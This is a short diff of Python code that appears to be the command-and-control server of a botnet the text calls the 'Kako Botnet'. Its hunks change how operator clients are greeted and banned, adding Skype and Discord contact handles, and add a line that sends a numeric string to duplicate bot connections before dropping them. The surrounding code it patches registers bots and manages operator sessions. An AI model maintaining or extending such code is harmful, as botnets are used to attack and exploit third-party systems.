@@ -43,7 +43,7 @@ def clientThread(conn):
 		ip = load(urlopen('http://jsonip.com'))['ip']
 		if ip in banned:
 			conn.send("[!] Your IP Address has been banned.\r\n")
-			conn.send("[>] Please contact live:zerefdragneelbro on skype for this to be removed. [<]\r\n")
+			conn.send("[>] Please contact live:zerefdragneelbro on Skype, or [SuperNova] Law#6800 on Discord. For this to be removed. [<]\r\n")
 			clientDisconnect()
 			sys.exit()
 		else:
@@ -68,7 +68,7 @@ def clientThread(conn):
 			conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
 			conn.sendall("[?] Please use the custom client.py made by Law\r\n")
 			conn.sendall("[?] Or else it made not work as its been untested with other clients\r\n")
-			conn.sendall("[?] Type >help for a list of commands [?]\r\n")
+			conn.sendall("[?] Type >help for a list of commands\r\n")
 			conn.sendall("[?] Your nickname is: %s" % nickname)
 			while True:
 				try:
@@ -171,6 +171,7 @@ def bot_thread(conn):
 	ip = load(urlopen('http://jsonip.com'))['ip']
 	if ip in ips:
 		print("[*] DUP Detected. Removing DUP.")
+		conn.send("46617043704647071717889523522")
 		conn.close()
 
 	ips.append(ip)
